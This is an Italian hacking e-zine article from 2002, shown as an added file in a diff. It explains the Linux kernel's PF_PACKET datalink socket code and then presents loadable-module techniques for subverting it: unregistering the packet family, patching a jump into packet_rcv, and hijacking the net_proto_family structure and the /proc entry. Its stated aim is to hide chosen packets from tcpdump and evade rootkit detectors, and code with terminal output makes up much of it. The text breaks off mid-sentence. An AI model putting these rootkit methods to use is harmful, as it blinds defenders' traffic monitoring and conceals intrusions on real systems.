@@ -1,0 +1,1030 @@
+==============================================================================
+--------------------[ BFi11-dev - file 07 - 30/03/2002 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ LKN: ATTACC0 A DATALiNK LAYER
+-----[ ulix <ulix@gmx.it>
+
+
+
+               ---[ L I N U X   K E R N E L   N O T E S ]---
+        ----[ A T T A C C O   A   D A T A L I N K   L A Y E R ]----
+
+
+                 ulix <ulix@gmx.it>  25.01.2002 / 19.03.2002
+
+
+
+
+- I n t r o d u z i o n e
+
+  La particolare implementazione delle socket a livello datalink nel kernel di
+linux, (parlando dei piu' recenti kernel, dalla serie 2.0.x alla 2.4.x, ultima
+disponibile al momento della stesura di questi appunti), offre la possibilita'
+di studiare, anche con tools abbastanza rudimentali, cosa effettivamente si
+verifica al momento della ricezione di pacchetti che transitano sulla nostra
+network, o, piu' in generale, di tutti i pacchetti che, anche non oltrepassando
+la fase di routing che redirige il traffico verso i processi locali (INPUT),
+sono trasmessi attraverso una rete e che non sono diretti esplicitamente alla
+nostra macchina.
+
+  Con il passare del tempo sono state apportate diverse modifiche al kernel di
+linux, e con il rilascio della versione 2.2.x, e' stata introdotta una nuova
+famiglia di pacchetti, conosciuta come PF_PACKET, che ha facilitato notevolmente
+l'uso e la reimplementazione di librerie [1] e tools [2] utili all'analisi delle
+reti...
+
+  Per le ultime versioni della serie 2.4.x del kernel le cose non dovrebbero
+essere cambiate, nel senso che sin'ora, (ultima relase 2.4.18), nulla e' stato
+modificato nelle funzioni che si occupano della gestione delle socket PF_PACKET.
+
+
+
+- af_packet.c:   k e r n e l   l e v e l
+
+  La parte che piu' ci interessa e' racchiusa in un unico file che troviamo in
+.../net/packet/af_packet.c.
+
+  Durante l'inizializzazione del codice, che puo' essere compilato e come modulo
+e come parte integrante del kernel, abbiamo:
+
+    static int __init packet_init(void)
+    {
+            sock_register(&packet_family_ops);
+            register_netdevice_notifier(&packet_netdev_notifier);
+    #ifdef CONFIG_PROC_FS
+            create_proc_read_entry("net/packet", 0, 0, packet_read_proc, NULL);
+    #endif
+            return 0;
+    }
+
+  La chiamata che ci interessa e' sock_register, che implica la creazione della 
+famiglia PF_PACKET, con le relative correlate opzioni, infatti:
+
+    static struct net_proto_family packet_family_ops = {
+           family:         PF_PACKET,
+           create:         packet_create,
+    };
+
+  Notiamo i due campi in packet_family_ops: il primo definisce la famiglia, 
+l'altro indica quale funzione verra' usata per creare ex novo una socket di tipo
+PF_PACKET.
+
+  Le altre due chiamate servono rispettivamente per notificare lo stato della 
+rete e modificare di conseguenza la gestione dei pacchetti, e per creare un 
+entry nel filesystem virtuale proc (in /proc/net/packet...).
+
+  La funzione packet_create e' naturalmente il fulcro operativo di questa
+implementazione, per cui ora vediamo come essa agisce e a quali strutture e' 
+collegata:
+
+    static int packet_create (struct socket *sock, int protocol)
+    {
+            struct sock *sk;
+            int err;
+
+            ...
+            ...
+
+            if (sock->type != SOCK_DGRAM && sock->type != SOCK_RAW
+    #ifdef CONFIG_SOCK_PACKET
+                && sock->type != SOCK_PACKET
+    #endif
+                )
+                    return -ESOCKTNOSUPPORT;
+
+            sock->state = SS_UNCONNECTED;
+            MOD_INC_USE_COUNT;
+
+            err = -ENOBUFS;
+            sk = sk_alloc(PF_PACKET, GFP_KERNEL, 1);
+            if (sk == NULL)
+                    goto out;
+
+            sock->ops = &packet_ops;
+    #ifdef CONFIG_SOCK_PACKET
+            if (sock->type == SOCK_PACKET)
+                    sock->ops = &packet_ops_spkt;
+    #endif
+            sock_init_data(sock,sk);
+
+            sk->protinfo.af_packet = kmalloc(sizeof(struct packet_opt),
+                                                            GFP_KERNEL);
+            if (sk->protinfo.af_packet == NULL)
+                    goto out_free;
+            memset(sk->protinfo.af_packet, 0, sizeof(struct packet_opt));
+            sk->family = PF_PACKET;
+            sk->num = protocol;
+
+            sk->destruct = packet_sock_destruct;
+            atomic_inc(&packet_socks_nr);
+
+            spin_lock_init(&sk->protinfo.af_packet->bind_lock);
+            sk->protinfo.af_packet->prot_hook.func = packet_rcv;
+    #ifdef CONFIG_SOCK_PACKET
+            if (sock->type == SOCK_PACKET)
+                    sk->protinfo.af_packet->prot_hook.func = packet_rcv_spkt;
+    #endif
+            sk->protinfo.af_packet->prot_hook.data = (void *)sk;
+
+            if (protocol) {
+                    sk->protinfo.af_packet->prot_hook.type = protocol;
+                    dev_add_pack(&sk->protinfo.af_packet->prot_hook);
+                    sock_hold(sk);
+                    sk->protinfo.af_packet->running = 1;
+            }
+
+            ...
+            ... 
+            
+            sk->next = packet_sklist;
+            packet_sklist = sk;
+            sock_hold(sk);
+
+            ...
+            ...
+
+    }
+
+  Ora, tralasciando le parti piu' oscure, partiamo dagli argomenti che vengono
+passati a packet_create: struct socket *sock, int protocol.
+
+  Attraverso la 'struct socket *sock' (in .../include/linux/net.h), si
+verificano tutti i parametri passati alla syscall al momento della creazione,
+e con la variabile 'int protocol' si stabilisce il protocollo di trasmissione,
+(quando 'protocol' e' settato a htons(ETH_P_ALL), allora tutti i protocolli
+vengono captati...).
+
+  Una volta passati i controlli sopracitati, viene chiamata la funzione sk_alloc
+(in .../net/core/sock.c) a cui si passa la famiglia dei pacchetti (PF_PACKET). 
+Questa funzione non fa altro che allocare memoria per una nuova struct socket *,
+i cui valori saranno correttamente settati in successione.
+
+  Dopo aver accertato la disponibilita' della nuova struct socket *, si passano
+le opzioni alla struct socket principale (quella passata come argomento...):
+
+    sock->ops = &packet_ops;
+
+  A seconda del tipo di socket, verranno passati diversi tipi di opzioni, che
+pertanto, con minime differenze, saranno simili tra loro.
+
+  Scendendo ad analizzare la sruttura 'packet_ops' nei particolari, avremo:
+
+    struct proto_ops packet_ops = {
+            family:         PF_PACKET,
+
+            release:        packet_release,
+            bind:           packet_bind,
+            connect:        sock_no_connect,
+            socketpair:     sock_no_socketpair,
+            accept:         sock_no_accept,
+            getname:        packet_getname,
+            poll:           packet_poll,
+            ioctl:          packet_ioctl,
+            listen:         sock_no_listen,
+            shutdown:       sock_no_shutdown,
+            setsockopt:     packet_setsockopt,
+            getsockopt:     packet_getsockopt,
+            sendmsg:        packet_sendmsg,
+            recvmsg:        packet_recvmsg,
+            mmap:           packet_mmap,
+            sendpage:       sock_no_sendpage,
+    };
+
+  In cui sono definite tutte le funzioni utili al corretto funzionamento della
+socket appena creata. Importanti, con una occhio particolare alle possibili
+modifiche, sono 'recvmsg: packet_recvmsg', e 'bind: packet_bind'. Tutte le
+altre sono normali funzioni per la gestione ottimale dei pacchetti, della vm
+e cosi' via...
+
+  Dopo questo, finalmente si inizializzano i dati delle due strutture con la
+chiamata a sock_init_data:
+
+    sock_init_data(sock, sk);
+
+  Ora la socket da noi richiesta e' pienamente registrata e funzionante, e da
+questo momento in poi, si passa al settaggio dei vari hook (legali questi...).
+
+  Si inizia con l'allocare memoria per una 'struct packet_opt' puntata da
+'af_packet' all'interno della struct sock (verificate andando a spulciare
+l'header e l'unione di questi emembri, in .../include/net/sock.h):
+
+    sk->protinfo.af_packet = kmalloc(sizeof(struct packet_opt), GFP_KERNEL);
+
+    if (sk->protinfo.af_packet == NULL)
+            goto out_free;
+    memset(sk->protinfo.af_packet, 0, sizeof(struct packet_opt));
+
+  Poi viene settata la famiglia dei pacchetti, il protocollo, e la funzione che
+servira' per chiudere, al momento della richiesta, la socket creata:
+
+    sk->family = PF_PACKET;
+    sk->num = protocol;
+
+    sk->destruct = packet_sock_destruct;
+
+  La parte fondamentale, che sara' oggetto piu' approfondito dei nostri studi,
+e' il settaggio della funzione che permettera' la ricezione di tutti i pacchetti
+del tipo da noi scelto:
+
+    sk->protinfo.af_packet->prot_hook.func = packet_rcv;    
+
+  Si e' gia' constatato sopra che 'af_packet' e' un puntatore alla struttura
+struct packet_opt, cosi' definita all'inizio di af_packet.c:
+
+    struct packet_opt
+    {
+            struct packet_type      prot_hook;
+            spinlock_t              bind_lock;
+            char                    running;
+            int                     ifindex;
+            struct tpacket_stats    stats;
+
+            ...
+            ... 
+    };
+
+  E poiche'attraverso 'prot_hook' si puo' accedere alla struct packet_type:
+
+    struct packet_type
+    {
+            unsigned short       type;
+            struct net_device    *dev;
+            int                  (*func) (struct sk_buff *, struct net_device *,
+                                         struct packet_type *);
+            void                 *data;
+            struct packet_type   *next;
+    };
+
+  Avremo che il puntatore a funzione '(*func)', sara' proprio la funzioncina
+tanto utile quale packet_rcv: la ricezione di tutti i pacchetti a livello 
+datalink, con la possibilita' di decisione *volontaria* di quali pacchetti
+devono passare e quali no...
+
+  Pian piano, dopo aver settato l'hook per ricevere i pacchetti,
+s'inizializzano gli altri campi della struct packet_type, e se 'int protocol'
+e' un protocollo valido, si aggiunge un packet handler al network stack con la
+chiamata alla funzione dev_add_pack (in .../net/core/dev.c):
+
+    sk->protinfo.af_packet->prot_hook.data = (void *)sk;
+
+    if (protocol) {
+            sk->protinfo.af_packet->prot_hook.type = protocol;
+            dev_add_pack(&sk->protinfo.af_packet->prot_hook);
+            ...
+            sk->protinfo.af_packet->running = 1;
+    }
+
+  Tutto allora si risolve con una chiamata a dev_add_pack, e vari settaggi tra
+le strutture linkate assieme... ma non risulta comunque - affatto - facile
+gestire i propri packet handler per modificare la ricezione dei pachetti a 
+livello datalink...
+
+
+
+- P r e m e s s e   p e r   l ' A t t a c c o
+
+  Dovrebbe essere chiaro - allora - come e' strutturata la gestione del
+datalink layer, a quale chiamate fa riferimento per la gestione dei pacchetti
+in entrata ed uscita, e quali sono le possibilita' che esso ci offre - idee
+permettendo - per un possibile attacco.
+
+  La cosa fondamentale da far notare e' che durante l'inizializzazione abbiamo
+a che fare con il settaggio di molte strutture e sottostrutture, quali:
+
+    static struct net_proto_family packet_family_ops = {
+           family:         PF_PACKET,
+           create:         packet_create,
+    };
+
+  Che poi, chiamando packet_create al momento dell'apertura di una socket,
+linkera' a sock->ops le opzioni packet_ops definite e viste sopra...
+
+    static struct notifier_block packet_netdev_notifier = {
+        notifier_call:  packet_notifier,
+    };
+
+
+  Le domande da porsi arrivati a questo punto sono molteplici:
+
+    a)  E' possibile in qualche modo intercettare una delle tante funzioni
+        atte alla ricezione dei pacchetti senza modificare alla radice il
+        sistema di gestione delle socket (del tipo __NR_socketcall ect...) ?
+
+    b)  Quante possibilita' abbiamo di linkare delle nostre funzioni a
+        quelle definite all'interno di - per esempio - packet_create ?
+
+    c)  Possiamo implementare un packet handler secondo nostre particolari
+        caratteristiche, senza preoccuparci di venire scoperti dal primo
+        rootkit detector che viene fatto partire (del tipo StMichael [3], che
+        dirotta le principali syscall sulle sue, dov'e' implementato un check
+        degli indirizzi... o anche del controllo dell'hijaction mostrato nelle
+        tecniche sviluppate da Silvio [4]...) ?
+
+  E le risposte si possono trovare, se non proprio con placida immediatezza,
+con lo studio adeguato delle funzioni in questione, la conoscenza delle piu'
+varie techniche, e furiosi test che rispondono nient'altro che con un dump
+dello stack nove volte su dieci...
+
+  Quindi:
+
+  La possibilita' di intercettare le funzioni che gestiscono la ricezione dei
+pacchetti a livello datalink puo' essere abbastanza semplice:
+
+    a) seguendo le note tecniche di Silvio, andando a modificare un'offset
+       preciso con dei byte che non sono altro che la traduzione in linguaggio
+       macchina di un jump indiretto all'indirizzo che noi settiamo loadando
+       il modulo;
+
+    b) cercando in qualche modo di modificare le strutture packet_ops e 
+       packet_ops_spkt definite e settate all'interno di packet_create
+       (intercettando proprio quest'ultima chiamata, poi?);
+
+    c) studiando un nuovo modo, per bypassare la _maggior parte_ dei tools
+       presenti sulla rete, magari senza modificare byte codes e indirizzi di
+       funzioni e, ma pensiero sottointeso, ancor di meno la socketcall;
+
+    d) impazzire a scriversi tutto cio' che ci interessa all'interno della
+       memoria virtuale del kernel, come visto in altri rootkit [5], senza
+       possibilita' alcuna, pero', di verificare il comportamento delle
+       funzioni implementate.
+
+
+
+- I d e e
+
+  Supponendo di non voler affatto approfondire l'implementazione del datalink
+nei sorgenti del kernel, delle strutture ad esso correlate e della
+manipolazione che le 'struct sock *' subiscono nel momento in cui qualsiasi
+cosa passa per la loro strada, (copia, allocazione, negazione, ritrasmissione
+di sk_buff...), e cosi' via dicendo, certamente il metodo piu' banale e
+veloce, seppur nella sua complessita', e' quello di utilizzare l'hijaction
+delle funzioni, seguendo di pari passo gli esempi di Silvio nei suoi articoli:
+
+  - si ricava l'indirizzo di packet_rcv [che e' la funzione a piu' basso
+    livello presente nell'implementazione di pf_packet dal lato network...]
+    da System.map (colgo l'occasione per far notare che e' assolutamente
+    improbabile trovare questa funzione esportata, ma ne parlero' in seguito);
+
+  - si gestisce la ricezione dei pacchetti come meglio si crede, a seconda
+    delle proprie necessita' ;) o idee;
+
+  - si resetta il nuovo bytecode con il jump indiretto e via dicendo...
+
+  Quando, (e non prima), sara' creata una socket a livello datalink, la
+funzione packet_create settera' tutte le belle cose viste su, compreso il
+packet handler che si occupa della ricezione (::proto_hook = packet_rcv...).
+Ebbene, non appena packet_rcv verra' chiamata, il nostro jump si attivera', e
+in proto_hook, sicuro al 99% dei casi, si trovera' la nostra bella e nuova e
+diversa funzioncina, che gestira' i pacchetti in arrivo in modo del tutto
+speciale (sta a voi e alle vostre esigenze...).
+
+  E non c'e` piu' nulla da fare per qualsiasi tool che utilizza le socket a
+datalink [per esempio libpcap?]...
+
+  Ma con l'hijaction di packet_rcv andiamo a modificare direttamente la prima
+parte di codice di questa funzione, inserendo nostro codice, e:
+
+  - se qualcosa va male, abbiamo perso il sistema;
+
+  - se viene utilizzato un rootkit detector, nel 50% dei casi, diciamo 40%,
+    il bytecode iniziale della funzione modificata verra' scoperto, e addio
+    asprirazioni [anche se StMichael, per esempio, non scoprisse l'hack,
+    con un semplice tool che confronta gli offset tra System.map e /dev/kmem
+    saremmo fuori...].
+
+  Se vogliamo agire in un modo differente, potremmo prendere in considerazione
+le tecniche pubblicate da vecna [6], agendo direttamente sulle strutture che
+legano i vari protocolli...
+
+  Vi rimando alla lettura dell'articolo per un approfondimento su questa tecnica
+e vi incoraggio al test dei moduli, che offrono la possibilita' _reale_ di
+sovvertire il normale funzionamento delle socket...
+
+  Anche se una piccola nota e' d'obbligo:
+
+  - agendo in questo modo, cioe' dirottando le funzioni linkate all'interno
+    della struttura sock->ops->[...], esiste un remoto, improbabile, ma _non_
+    impossibile caso, che le strutture iniziali del protocollo, (cioe' proprio
+    le 'struct proto_ops' del tratto [...]->ops->[...]), siano gia' modificate
+    a prescindere dal tipo di protocollo, famiglia o socket utilizzati:
+    se cosi' fosse, si andrebbero a modificare delle funzioni che gia' in
+    partenza, magari, implementano un loro handler, e che agiscono ad un
+    livello sicuramente piu' basso del nostro;
+
+  - non si riesce comunque a mascherare la nuova implementazione, poiche' si
+    agisce nuovamente tramite l'hijaction delle funzioni, anche se a farne le
+    spese son poi le strutture.
+
+
+
+- I m p l e m e n t a z i o n i
+
+  Arrivati a questo punto, con le sommarie conoscenze di cui sopra, prendiamo
+in considerazione varie idee che mettono in pratica cio' che si e' appreso.
+
+  Il metodo piu' banale, e anche il meno elegante, per sottrarsi al controllo
+dei pacchetti a datalink layer e' cancellare dal sottosistema network la
+famiglia PF_PACKET: in questo modo, una volta non piu' presente sul sistema
+questa famiglia, l'intera routine di gestione del datalink puo' essere
+rimpiazzata, tramite LKM o quel che piu' vi aggrada, con le nostre funzioni,
+che durante l'inizializzazione registreranno PF_PACKET con l'opportuna
+chiamata e gestiranno di conseguenza tutto il layer...
+
+    ...
+    ...
+
+    int init_module (void)
+    {
+            sock_unregister(PF_PACKET);
+            dbg("socket (PF_PACKET) unregistered...\n");
+            dbg("module loaded...\n");
+            return (0);
+    }
+
+    ...
+    ...
+
+  sock_unregister permette di cancellare la famiglia passatale come argomento
+dalla lista delle famiglia dei protocolli (in .../net/socket.c):
+
+    static struct net_proto_family *net_families[NPROTO];
+
+    int sock_unregister (int family)
+    {
+            if (family < 0 || family >= NPROTO)
+                    return -1;
+
+            net_family_write_lock();
+            net_families[family] = NULL;
+            net_family_write_unlock();
+            return 0;
+    }
+
+  'net_families[family] = NULL' e' la parte operativa della funzione, che
+semplicemente assegna NULL all'array di strutture con indice 'family', che e'
+il numero della famiglia che le si passa... dopo di che', anche se le funzioni
+linkate staticamente nel kernel rimangono li' dove sono, non esistendo piu'
+PF_PACKET, non si puo' raggiungere il layer datalink in alcun modo...
+
+  L'esempio che segue mostra come agisce tcpdump dopo l'inserimento di un LKM
+che cancella PF_PACKET come mostrato sopra:
+
+  [root@kreta usk]#
+  [root@kreta usk]# insmod usk.o
+  uks: init_module: socket (PF_PACKET) unregistered...
+  uks: init_module: module loaded...
+  [root@kreta usk]#
+  [root@kreta usk]# tcpdump -vvv -i eth0
+  tcpdump uses obsolete (PF_INET,SOCK_PACKET)
+  tcpdump: no suitable device found
+  [root@kreta usk]#
+  [root@kreta usk]# tcpdump -vvv -i lo
+  tcpdump: socket: Address family not supported by protocol
+  [root@kreta usk]#
+  [root@kreta usk]#
+
+  Quando si richiama tcpdump su un'interfaccia ethernet, 'tcpdump: no suitable
+device found' compare alla nostra vista, mentre quando lo si chiama su
+l'interfaccia di loopback, 'tcpdump: socket: Address family not supported by
+protocol', che spiega chiaramente cos'accade: famiglia non supportata dal
+protocollo...
+
+  Ma questo e' davvero un bel po' banale, anche se in alcuni casi potrebbe pur
+servire (non so in quali, pero'... fate voi...).
+
+ Il secondo metodo segue la linea teorica dell'hijaction. Si ricava l'indirizzo
+della funzione che ci interessa, si lavora un po' con il bytecode, e si
+controlla il passaggio, la trasmissione e la negazione di particolari pacchetti:
+
+    int new_packet_rcv
+    (struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt)
+    {
+             struct ipv6hdr *hdr = skb->nh.ipv6h;
+             u_int8_t half_tclass = hdr->priority;
+
+             dbg("src: %04x:%04x:%04x:%04x:%04x:%04x:%04x:%04x\n",
+                                                    dip(hdr->saddr));
+             dbg("src: %04x:%04x:%04x:%04x:%04x:%04x:%04x:%04x\n",
+                                                    dip(hdr->daddr));
+
+             dbg("len: %u tclass: %u hlim: %u flowlabel: %u\n",
+                   ntohs(hdr->payload_len) + sizeof(struct ipv6hdr),
+                   (ntohl(*(u_int32_t *)hdr) & 0x0ff00000) >> 20,
+                   hdr->hop_limit,
+                   (ntohl(*(u_int32_t *)hdr) & 0x000fffff));
+
+             if (!half_tclass) {
+                     int ret;
+                     /** resetting old byte_code **/
+                     recode(old_packet_rcv, old_rcv_code, SIZE);
+                     /** saving original func + original args **/
+                     ret = old_packet_rcv(skb, dev, pkt);
+                     /** resetting jump in our func **/
+                     recode(old_packet_rcv, new_rcv_code, SIZE);
+                     /** return original func + original args **/
+                     return (ret);
+             }
+             return (0);
+    }
+
+    int init_module (void)
+    {
+             *(long *)&new_rcv_code[1] = (long)new_packet_rcv;
+             dbg("setting new_rcv_code[1]...\n");
+             recode(old_rcv_code, old_packet_rcv, SIZE);
+             dbg("saving old_rcv_code...\n");
+             recode(old_packet_rcv, new_rcv_code, SIZE);
+             dbg("setting new_rcv_code in old_packet_rcv...\n");
+
+             dbg("module loaded...\n");
+             return (0);
+    }
+
+  In questo caso, la funzione presa di mira e' 'packet_rcv', atta alla
+ricezione di tutti i pacchetti (anche se ci sono delle varianti...).
+
+  Si esegue la copia dei primi sette byte della vecchia funzione (cosi' da
+poterla poi ripristinare), e si setta in new_rcv_code[1] l'indirizzo della
+funzione che rimpiazzera' packet_rcv, e cosi' di seguito...
+
+  Nel momento in cui si riceve un pacchetto ipv6 (e' solo un possibile
+esempio), in cui l'ex campo priority dell'ipv6 header e' settato, si ritorna
+zero; se accade il contario, si ripristinano i byte dela funzione, e si
+ritorna la funzione originale con i suoi argomenti originali, come se nulla
+fosse...
+
+  L'esempio mostra il passaggio dei pacchetti visto con tcpdump:
+
+  <ipv6.kreta.net>
+  [root@kreta prh]# insmod pktrcv.o
+  pktrcv: init_module: setting new_rcv_code[1]...
+  pktrcv: init_module: saving old_rcv_code...
+  pktrcv: init_module: setting new_rcv_code in old_packet_rcv...
+  pktrcv: init_module: module loaded...
+  [root@kreta prh]#
+  [root@kreta prh]#
+
+  <vzone.net>
+  [root@vzone dlh]# ./kreta -s ab::c:d -d ipv6.kreta.net -N 2
+  2 packets sent...
+  [root@vzone dlh]#
+
+  <ipv6.kreta.net>
+  [root@kreta prh]# tcpdump -vvv
+  eth0: Promiscuous mode enabled.
+  device eth0 entered promiscuous mode
+  tcpdump: listening on eth0
+  01:02:49.233422 ab::c:d > ipv6.kreta.net: no next header [flowlabel 0xfffff]
+  01:02:49.233732 ab::c:d > ipv6.kreta.net: no next header [flowlabel 0xfffff]
+  
+  <vzone.net>
+  [root@vzone dlh]# ./kreta -s ab::c:d -d ipv6.kreta.net -N 2 -p 1
+  2 packets sent...
+  [root@vzone dlh]#
+
+  <ipv6.kreta.net>
+  [root@kreta prh]# tcpdump -vvv
+  eth0: Promiscuous mode enabled.
+  device eth0 entered promiscuous mode
+  tcpdump: listening on eth0
+  01:02:49.233422 ab::c:d > ipv6.kreta.net: no next header [flowlabel 0xfffff]
+  01:02:49.233732 ab::c:d > ipv6.kreta.net: no next header [flowlabel 0xfffff]
+
+  Dall'host vzone.net invio prima due pacchetti ipv6 senza l'opzione -p, che
+setta il campo priority con il valore che gli e' passato per argomento, e come
+si nota, su ipv6.kreta.net i due pacchetti arrivano belli e buoni... dopo pero'
+invio altri due pacchetti con l'opzione -p 1, e setto quindi il campo priority
+a 1, e su ipv6.kreta.net i pacchetti arrivano, certo, ma _non_ si vedono,
+fermati dal check della nostra funzione (anche se di modi per fare questo
+ce ne sono a bizzeffe, ma visto che si deve provare, tanto vale...).
+
+
+
+- L a   T e c n i c a
+
+  Passando dall'hijaction delle funzioni a diversi hook per netfilter, o agendo
+sulla sys_socketcall per dirottare le opzioni dei protocolli, l'unica cosa che
+m'interessava era quella di non modificare alcun byte durante
+l'implementazione; trovare un metodo che mi permettesse di lavorare in kernel
+level, senza essere scovato da ids o detector durante il loading del LKM...
+
+  Tutto parte dallo studio delle tecniche di Silvio, da prove utili e inutili,
+e dalla capacita' di guardare il codice del kernel di linux da un'ottica
+diversa rispetto a quella di chi lo programma...
+
+  Pensando alla fine che all'interno del kernel vi sono milioni di differenti
+strutture che si legano tra loro, e che nella maggior parte dei casi e' proprio
+all'interno di esse che si trovano i puntatori a funzioni utili alla gestione
+dei piu' vari compiti, l'unico modo per ovviare alla modifica diretta di codice 
+o all'inserimento di jump su funzioni originali, e' proprio quello di utilizzare
+le strutture.
+
+  Silvio ci presento' l'hijaction delle funzioni, dopo quello delle syscall...
+In questo articolo si presenta, invece, l'hijaction diretto delle strutture,
+in un modo piu' o meno simile a quello di Silvio, senza andare a modificare,
+pero', il bytecode.
+
+    /**
+     cast net_proto_family, *npf now has the original struct...
+    **/
+    struct net_proto_family *npf = (struct net_proto_family *)0x[...];
+
+    int init_module (void)
+    {
+            dbg("npf->family....... %d\n", npf->family);
+            dbg("npf->create....... %p\n", npf->create);
+
+            return (0);
+    }
+
+  Con un cast della struttura che ci interessa, e l'indirizzo della struttura,
+ricavabile attraverso System.map o quant'altro, siamo in grado di ottenere un
+puntatore alla struttura, con le relative opzioni, campi e funzioni al suo
+interno; e da qui il passo a modificare le opzioni o quanto interessa e'
+davvero breve...
+
+  L'esempio sopra mostra l'utilizzo pratico di questa tecnica, ricavando
+l'indirizzo di 'struct net_proto_family packet_family_ops' definita all'interno
+di af_packet.c, che controlla la funzione packet_create, gia' vista sopra, atta
+alla gestione delle socket PF_PACKET, all'assegnamento delle varie opzioni
+packet_ops e packet_ops_spkt, e della funzione packet_rcv...
+
+  Il centro del sistema di gestione delle socket a datalink layer...
+
+  Naturalmente, dirottando questa struttura, si devono modificare di conseguenza
+tutte le altre funzioni di af_packet.c, ma questo e' un dettaglio, o una scelta
+di implementazione a seconda di quanto e' davvero utile.
+
+  La mia idea e' stata quella di modificare questa struttura, avendo cosi'
+accesso all'intera gestione del datalink, e la possibilita' di modificare come
+meglio credevo qualsiasi funzione presente, dalla ricezione (packet_rcv[msg])
+alla trasmissione (packet_sendmsg), dall'io (packet_ioctl) al rilascio delle
+socket create (packet_release), e cosi' via...
+
+  Notate bene, comunque, che le possibilita' sono davvero tante, e a voler
+essere bravi, si potrebbe modificare packet_mmap, per esempio, o la gestione
+di getsockopt e setsockopt...
+
+  Il codice, invece, a parte le poche modifiche per mostrarne l'utilizzo, e'
+praticamente identico all'implementazione del kernel, riportato di pari passo
+cosi' com'e', nulla escluso. Una volta loadato, la gestione del datalink passa
+dal codice del kernel a quello nostro, e di conseguenza ogni funzione chiamata
+da user level verra' gestita dal nostro LKM:
+
+
+
+             socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
+                           [sys_socketcall]
+  +----------------+                               +----------------+
+  |     kernel     | <---------------------------- |                |
+  +----------------+                               |                |
+          |                                        |                |
+          |                                        |                |
+          | [ sock_create                 ]        |                |
+          | [ +--> packet_create          ]        |    tcpdump     |
+          | [        +--> packet_ops      ]        |                |
+          | [        +--> packet_ops_spkt ]        |                |
+          |                                        |                |
+          v                                        |                |
+  +----------------+                               |                |
+  |     dlhook     | <---------------------------> |                |
+  +----------------+                               +----------------+
+                          [listening socket]
+
+
+
+  Quando tcpdump (ad esempio...) aprira' una socket PF_PACKET:
+
+    a) chiamera' socket con gli argomenti visti sopra;
+
+    b) a kernel level, sys_socketcall gestira' la chiamata e passera' tutto
+       a sys_socket;
+
+    c) sys_socket chiamera' sock_create, passandole famiglia, tipo e protocollo;
+
+    d) sock_create gestira' tutto nel modo piu' trasparente possibile, e 
+       tramite [famiglia]->create(args) creera' la socket.
+
+  Studiando sock_create, abbiamo:
+
+    static struct net_proto_family *net_families[NPROTO];
+
+    int sock_create(int family, int type, int protocol, struct socket **res)
+    {
+            ...
+            ...  
+    /*
+     *      Allocate the socket and allow the family to set things up. if
+     *      the protocol is 0, the family is instructed to select an
+     *      appropriate default.
+     */
+
+            if (!(sock = sock_alloc()))
+            {
+                    printk(KERN_WARNING "socket: no more sockets\n");
+                    i = -ENFILE;            /* Not exactly a match, but its the
+                                               closest posix thing */
+                    goto out;
+            }
+
+            sock->type  = type;
+
+            if ((i = net_families[family]->create(sock, protocol)) < 0)
+            {
+                    sock_release(sock);
+                    goto out;
+            }
+
+            *res = sock;
+
+    out:
+            net_family_read_unlock();
+            return i;
+    }
+
+  Quello che ci interessa e' 'net_families[family]->create(sock, protocol)',
+il momento in cui sock_create crea la socket. Come gia' visto, net_family e'
+un puntatore alla 'struct net_proto_family', che al suo interno contiene due
+variabili, una per determinare la famiglia, l'altra che e' un puntatore alla
+funzione 'create' diversa per ogni famiglia... ebbene, quando sock_create
+chiamera' [...]->create(...), e il nostro LKM sara' loadato, passera' tutta
+la gestione alle _nostre_ funzioni, a partire da un livello molto basso,
+iniziale, come la _creazione_ della socket, perche' la [...]->create(...) che
+chiamera', non sara' quella che risiede all'interno della memoria del kernel,
+ma la nostra...
+
+  Le note da fare sono due: poiche' la gestione delle socket passa al nostro
+LKM, all'interno di esso di deve modificare anche la gestione del proc
+filesystem, nel senso che, se lasciamo che le statistiche delle socket a
+datalink continuino ad essere gestite dall'originale packet_read_proc_entry,
+delle socket appena create non si sapra' nulla... Modificando quindi
+pde->read_proc, dove pde e' un puntatore alla proc_dir_entry di 'packet',
+(/proc/net/packet...), abbiamo accesso anche al proc filesystem, e in questo
+modo, pur non passando alcuni pacchetti, la socket e' visibile...
+
+  La funzione che permette di fare questo e' una reimplementazione di una parte
+di codice di palmers [7], con alcune piccole modifiche:
+
+    struct proc_dir_entry *fproc (char *name)
+    {
+            static struct proc_dir_entry *pde = NULL;
+
+            if (!name)
+                    return NULL;
+
+            pde = proc_net->subdir;
+
+            for (; strcmp (name, (char *) pde->name); pde = pde->next) {
+                    if (pde->subdir != NULL) {
+                            if (!strcmp (name, (char *) pde->subdir->name)) {
+                                    dbg("strcmp: pde %p...\n", pde);
+                                    return (pde = pde->subdir);
+                            }
+                    }
+                    dbg("pde %p...\n", pde);
+            }
+            return (pde);
+    }
+
+  Fondamentale e' la directory di partenza per la ricerca, che e' proc_net,
+cioe' la directory proc/net. Naturalmente una volta unloadato l'LKM, tutte le
+funzioni si ripristano.
+
+  Da tenere presente, comunque, che tutte le socket gia' attive, nel momento
+in cui loaderemo l'LKM, non si vedranno piu', poiche' LKM prende la lista delle
+socket da:
+
+    static struct sock * packet_sklist;
+    ...
+    ...
+    atomic_t packet_socks_nr;
+
+  Che sono definite al _suo_interno. Quindi di tutte le altre, che sono definite
+nella 'vera' packet_socks_nr, non se ne sapra' nulla. (ma con alcune modifiche
+questo e' bypassabile, per esempio andando a guardarsi, prima di loadare l'LKM,
+o le sue funzioni, proprio quel 'packet_socks_nr', che conterra' la lista delle
+socks attive... e poi perche' non farsi un giro anche per 'packet_sklist', e,
+prendendo di li' tutti i dati, ricostruire la statistica in modo trasparente? o
